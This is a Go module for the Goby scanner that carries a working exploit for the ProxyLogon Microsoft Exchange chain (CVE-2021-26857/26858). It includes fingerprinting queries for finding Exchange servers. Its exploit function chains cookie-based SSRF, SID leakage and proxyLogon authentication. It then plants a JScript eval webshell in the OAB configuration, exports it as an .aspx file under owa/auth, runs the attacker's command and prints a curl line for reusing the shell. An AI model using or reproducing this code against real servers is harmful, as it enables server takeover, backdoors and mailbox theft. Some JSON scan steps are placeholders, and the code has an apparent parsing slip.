package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Microsoft Exchange Server Remote Command Execution Vulnerability (CVE-2021-26857/CVE-2021-26858)",
    "Description": "<p>Microsoft Exchange Server is a suite of e-mail services programs from Microsoft Corporation of the United States. It provides mail access, storage, forwarding, voicemail, email filtering and filtering functions.</p><p>Microsoft Exchange Server has a remote command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Microsoft-Exchange",
    "Homepage": "https://www.microsoft.com/zh-cn/microsoft-365/exchange/email",
    "DisclosureDate": "2021-02-08",
    "Author": "twcjw",
    "FofaQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "GobyQuery": "banner=\"Microsoft ESMTP MAIL Service\" || banner=\"Microsoft Exchange Server\" || banner=\"Microsoft Exchange Internet Mail Service\" || banner=\"Microsoft SMTP MAIL\" || banner=\"Microsoft Exchange\" || (banner=\"owa\" && banner=\"Location\" && cert!=\"Technicolor\") || banner=\"Set-Cookie: OutlookSession\" || (((header=\"owa\" && (header=\"Location\" || header=\"X-Owa-Version\" || header=\"Set-Cookie: OWA-COOKIE\")) || (body=\"href=\\\"/owa/auth/\" && (title=\"Outlook\" || title=\"Exchange \" || body=\"var a_sLgn\" || body=\"aria-label=\\\"Outlook Web App\\\" class=\\\"signInImageHeader\"))) && header!=\"WordPress\" && body!=\"wp-content\" && body!=\"wp-includes\") || body=\"<!-- owapage = ASP.auth_logon_aspx\" || header=\"x-owa-version\" || body=\"window.location.replace(\\\"/owa/\\\" + window.location.hash);</script></head><body></body>\" || body=\"<meta http-equiv=\\\"Refresh\\\" contect=\\\"0;url=/owa\\\">\" || body=\"themes/resources/segoeui-semibold.ttf\" || title==\"Microsoft Outlook Web Access\" || body=\"aria-label=\\\"Outlook Web App\" || title=\"Outlook Web Access\" || header=\"OutlookSession\" || (body=\".mouse .owaLogoContainer, .twide .owaLogoContainer\" && body=\"owaLogoContainer\") || (body=\"<div class=\\\"signInHeader\\\">Outlook</div>\" && body=\"/owa/\") || (body=\"owapage = ASP.auth_logon_aspx\" && body=\"/owa/\" && (body=\"showPasswordCheck\" || body=\"Outlook\")) || (title=\"Outlook Web App\" && body=\"Microsoft Corporation\") || header=\"realm=\\\"Outlook Web App\" || ((body=\"使用 Outlook Web App \" || body=\" use Outlook Web App\") && body=\"Microsoft Corporation\")",
    "Level": "2",
    "Impact": "<p>Microsoft Exchange Server has a remote code execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/sirpedrotavares/Proxylogon-exploit"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "email",
            "type": "input",
            "value": "administrator@victim.corp",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2021-26857",
        "CVE-2021-26858"
    ],
    "CNNVD": [
        "CNNVD-202103-191"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "Microsoft Exchange Server 远程命令执行漏洞（CVE-2021-26857/CVE-2021-26858）",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server是美国微软（Microsoft）公司的一套电子邮件服务程序。它提供邮件存取、储存、转发，语音邮件，邮件过滤筛选等功能。</p><p>Microsoft Exchange Server 存在远程命令执行漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Exchange存在反序列化漏洞。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Microsoft Exchange Server Remote Command Execution Vulnerability (CVE-2021-26857/CVE-2021-26858)",
            "Product": "Microsoft-Exchange",
            "Description": "<p>Microsoft Exchange Server is a suite of e-mail services programs from Microsoft Corporation of the United States. It provides mail access, storage, forwarding, voicemail, email filtering and filtering functions.<br></p><p>Microsoft Exchange Server has a remote command execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.microsoft.com/zh-cn/microsoft-365/exchange/email\">https://www.microsoft.com/zh-cn/microsoft-365/exchange/email</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Microsoft Exchange Server has a remote code execution vulnerability. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7316"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randomName := goutils.RandomHexString(4) + ".js"
			// get fqdn
			cfg := httpclient.NewGetRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "X-BEResource=localhost~1942062522")
			resp, err := httpclient.DoHttpRequest(u, cfg)
			if err != nil {
				return false
			}
			if !(resp.Header.Get("X-F1eserver") == "") && !(resp.Header.Get("X-CalculatedBETarget") == "") {
				return false
			}
			FQDN := resp.Header.Get("X-FEServer")
			if FQDN != "" && strings.Contains(resp.Utf8Html, "NegotiateSecurityContext failed with for host 'localhost' with status 'TargetUnknown'") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			email := ss.Params["email"].(string)
			cmd := ss.Params["cmd"].(string)
			randomName := goutils.RandomHexString(4) + ".js"
			// get fqdn
			cfg := httpclient.NewGetRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", "X-BEResource=localhost~1942062522")
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if !(resp.Header.Get("X-F1eserver") == "") && !(resp.Header.Get("X-CalculatedBETarget") == "") {
				return expResult
			}
			FQDN := resp.Header.Get("X-FEServer")
			// auto discover
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;", FQDN))
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Data = fmt.Sprintf("<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\"><Request><EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>", email)
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 || !strings.Contains(resp.Utf8Html, "<LegacyDN>") {
				return expResult
			}
			legacyDn := strings.Split(resp.Utf8Html, "<LegacyDN>")[1]
			legacyDn = strings.Split(legacyDn, "</LegacyDN>")[0]
			serverId := strings.Split(resp.Utf8Html, "<Server>")[1]
			serverId = strings.Split(legacyDn, "</Server>")[0]
			//get user sid
			payload := "0000000000e4040000090400000904000000000000"
			payloadByte, _ := hex.DecodeString(payload)
			payload = fmt.Sprintf("%s%s", legacyDn, payloadByte)
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s@exchange.lab&a=~1942062522;", FQDN, serverId))
			cfg.Header.Store("Content-Type", "application/mapi-http")
			cfg.Header.Store("X-Requesttype", "Connect")
			cfg.Header.Store("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:2")
			cfg.Header.Store("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
			cfg.Header.Store("X-Clientapplication", "Outlook/15.0.4815.1002")
			cfg.Data = payload
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if !strings.Contains(resp.Utf8Html, "act as owner of a UserMailbox") {
				return expResult
			}
			sid := strings.Split(resp.Utf8Html, "with SID ")[1]
			sid = strings.Split(sid, " and MasterAccountSid")[0]
			// proxy logon
			proxyLogonRequest := fmt.Sprintf("<r at=\"Negotiate\" ln=\"Admin\"><s>%s</s></r>", sid)
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;", FQDN))
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Header.Store("msExchLogonMailbox", sid)
			cfg.Data = proxyLogonRequest
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 241 || strings.Contains(resp.HeaderString.String(), "set-cookie") {
				return expResult
			}
			sessId := resp.Cookie
			sessId = strings.Split(sessId, "ASP.NET_SessionId=")[1]
			sessId = strings.Split(sessId, ";")[0]
			msExchEcpCanary := resp.Cookie
			msExchEcpCanary = strings.Split(msExchEcpCanary, "msExchEcpCanary=")[1]
			msExchEcpCanary = strings.Split(msExchEcpCanary, ";")[0]
			// get default oab
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
			cfg.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("msExchLogonMailbox", sid)
			cfg.Data = "{\"filter\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"SelectedView\": \"\", \"SelectedVDirType\": \"All\"}}, \"sort\": {}}"
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			oabId := strings.Split(resp.Utf8Html, "\"RawIdentity\":\"")[1]
			oabId = strings.Split(oabId, "\"")[0]
			// oab inject shell
			shellContent := "<script language=\\\"JScript\\\" runat=\\\"server\\\">function Page_Load(){eval(Request[\\\"request\\\"],\\\"unsafe\\\");}</script>"
			oabJson := fmt.Sprintf("{\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": \"%s\"}, \"properties\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"ExternalUrl\": \"http://ooo/#%s\"}}}", oabId, shellContent)
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
			cfg.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("msExchLogonMailbox", sid)
			cfg.Data = oabJson
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			// verify shell
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
			cfg.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("msExchLogonMailbox", sid)
			cfg.Data = "{\"filter\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"SelectedView\": \"\", \"SelectedVDirType\": \"All\"}}, \"sort\": {}}"
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			if !strings.Contains(resp.Utf8Html, "ExternalUrl") && !strings.Contains(resp.Utf8Html, "Page_Load()") {
				return expResult
			}
			// oab export shell
			shellName := goutils.RandomHexString(4) + ".aspx"
			shellPath := "\\\\\\\\127.0.0.1\\\\c$\\\\Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\" + shellName
			oabJson = fmt.Sprintf("{\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": \"%s\"}, \"properties\": {\"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"FilePathName\": \"%s\"}}}", oabId, shellPath)
			cfg = httpclient.NewPostRequestConfig(fmt.Sprintf("/ecp/%s", randomName))
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Cookie", fmt.Sprintf("X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s", FQDN, msExchEcpCanary, sessId, msExchEcpCanary))
			cfg.Header.Store("Content-Type", "application/json; charset=utf-8")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("msExchLogonMailbox", sid)
			cfg.Data = oabJson
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode != 200 {
				return expResult
			}
			time.Sleep(time.Second * 2)
			shellUri := fmt.Sprintf("/owa/auth/%s", shellName)
			cfg = httpclient.NewPostRequestConfig(shellUri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("request=Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"%s\").stdout.readall())", cmd)
			resp, err = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
			if err != nil {
				return expResult
			}
			if resp.StatusCode == 200 {
				expResult.Success = true
				expResult.Output = resp.Utf8Html + "\r\nWebshell Addr: " + fmt.Sprintf("curl --request POST --url %s%s --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami /all\").stdout.readall())' -k", expResult.HostInfo.FixedHostInfo, shellUri)
				return expResult
			}
			return expResult
		},
	))
}
